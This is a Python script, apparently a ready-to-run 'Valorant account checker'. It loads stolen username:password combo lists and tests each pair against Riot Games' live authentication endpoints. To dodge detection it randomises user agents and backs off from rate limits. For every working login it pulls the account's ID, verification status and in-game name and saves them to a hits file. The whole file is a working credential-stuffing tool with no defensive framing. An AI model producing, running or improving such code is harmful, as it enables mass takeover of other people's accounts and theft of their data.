import random
import asyncio
import fake_useragent
import aiohttp
import re
import threading
import datetime
import os


class ValorantAccountChecker:

    def __init__(self) -> None:
        self._useragents = [
            "ie", "msie", "Internet Explorer", "opera", "chrome", "google", "google chrome", "firefox", "ff", "safari", "random"
        ]

        self._errors = {
            "auth_failure": "Invalid credentials"
        }

        self._endpoints = {
            "authorization": "https://auth.riotgames.com/api/v1/authorization",
            "token": "https://entitlements.auth.riotgames.com/api/token/v1",
            "userInfo": "https://auth.riotgames.com/userinfo",
            "weapons": "https://valorant-api.com/v1/weapons",
            "clientVersion": "https://valorant-api.com/v1/version"
        }
        self._threads = []
        self._combos = []

        self._valid = 0
        self._invalid = 0

        self._hits = ''
        self._now = datetime.datetime.now().strftime("%Y-%m-%d %H-%M-%S")

        self._loop = asyncio.get_event_loop()
        for combo in (open("./combos.txt", "r").read()).split("\n"):
            if combo not in self._combos and combo != '' and len(combo.split(":")) >= 2:
                self._combos.append(combo)

        # https://stackoverflow.com/questions/522563/accessing-the-index-in-for-loops
        for index, combo in enumerate(self._combos):
            t = threading.Thread(target=self._loop.create_task(
                self._check(combo.split(":")[0], combo.split(":")[1])))
            t.daemon = True
            self._threads.append(t)

        self._loop.create_task(self.closeIfDone())
        try:
            self._loop.run_forever()
        except:
            self._loop.stop()
        finally:
            self._loop.close()

    def _log(self, contentType, content):
        print(f"[{contentType.upper()}] {content}")

    async def closeIfDone(self):
        while True:
            if (len(self._combos) == 0):
                self._log(
                    "CHECKER", f"Successfully checked {int(self._valid + self._invalid)} account(s).")
                self._log("CHECKER", f"Valid: {int(self._valid)}")
                self._log("CHECKER", f"Invalid: {int(self._invalid)}")

                os.system("pause")
                os._exit(0)
            await asyncio.sleep(3)

    async def _genSessionId(self, session):
        return await session.post(self._endpoints['authorization'], json={
            "Content-Type": "application/json",
            "client_id": "play-valorant-web-prod",
            "nonce": "1",
            "redirect_uri": "https://playvalorant.com/opt_in",
            "response_type": "token id_token",
            "scope": "account openid",
            "withCredentials": "True",
            "credentials": "include",
        }, headers={
            "User-Agent": fake_useragent.UserAgent()[str(random.choice(self._useragents))]
        })

    async def _checkCombo(self, session, username, password):
        return await session.put(self._endpoints['authorization'], json={
            "Content-Type": "application/json",
            'type': 'auth',
            'username': username,
            'password': password
        }, headers={
            "User-Agent": fake_useragent.UserAgent()[str(random.choice(self._useragents))]
        })

    async def _genEntitlements(self, session, access_token):
        return await session.post(self._endpoints['token'], headers={
            "Content-Type": "application/json",
            "Authorization": f"Bearer {access_token}",
            "User-Agent": fake_useragent.UserAgent()[str(random.choice(self._useragents))]
        })

    async def _getInfo(self, session, access_token):
        return await session.post(self._endpoints['userInfo'], headers={
            "Authorization": f"Bearer {access_token}",
            "User-Agent": fake_useragent.UserAgent()[str(random.choice(self._useragents))]
        })

    async def _createSession(self):
        return aiohttp.ClientSession()

    async def _getClientVersion(self, session):
        return await session.get(self._endpoints["clientVersion"])

    async def _check(self, username, password, sleep=0):
        await asyncio.sleep(sleep)
        _session = await self._createSession()
        await self._genSessionId(_session)
        _comboCheck = await self._checkCombo(_session, username, password)

        try:
            if (await _comboCheck.json())['error']:
                if (await _comboCheck.json())['error'] == "rate_limited" or (await _comboCheck.json())['error'] == "invalid_session_id":
                    randSleep = random.choice([60, 120, 180, 240, 300, 360, 420])
                    self._log("ERROR", f"Rate limited, sleeping {randSleep} seconds")
                    await self._check(username, password, randSleep)
                    return
                else:
                    try:  # There is an error
                        self._log("INVALID", f"{int(self._invalid + self._valid) + 1}) {username}:{password} ({self._errors[(await _comboCheck.json())['error']]})")
                        self._invalid += 1
                        self._combos.remove(f"{username}:{password}")
                    except:
                        self._log("UNKNOWN", f"{int(self._invalid + self._valid) + 1}) {username}:{password} ({(await _comboCheck.json())['error']})")
                        self._invalid += 1
                        self._combos.remove(f"{username}:{password}")
        except:  # Valid
            # https://gist.github.com/Luc1412/1f93257a2a808679ff014f258db6c35b#file-auth_flow-py-L21
            pattern = re.compile(
                'access_token=((?:[a-zA-Z]|\d|\.|-|_)*).*id_token=((?:[a-zA-Z]|\d|\.|-|_)*).*expires_in=(\d*)')
            access_token = pattern.findall((await _comboCheck.json())['response']['parameters']['uri'])[0][0]
            # entitlements_token = (await (await self._genEntitlements(_session, access_token)).json())["entitlements_token"]
            _userInfo = await (await self._getInfo(_session, access_token)).json()

            self._hits += f'{username}:{password} | ID: {_userInfo["sub"]} | Phone Number Verified: {_userInfo["phone_number_verified"]} | E-Mail Verified: {_userInfo["email_verified"]} | Player Locale: {_userInfo["player_locale"]} | Ingame -> Status: {_userInfo["acct"]["state"]} | Ingame Name: {_userInfo["acct"]["game_name"]} | Tag Line: {_userInfo["acct"]["tag_line"]} | Display Name: {_userInfo["acct"]["game_name"]}#{_userInfo["acct"]["tag_line"]} | JTI: {_userInfo["jti"]}\n'
            self._combos.remove(f"{username}:{password}")
            open(f"./Hits/{str(self._now)}.txt", "w+").write(self._hits)
            self._log("VALID", f"{int(self._invalid + self._valid) + 1}) {username}:{password}")
            self._valid += 1

        await _session.close()


ValorantAccountChecker()
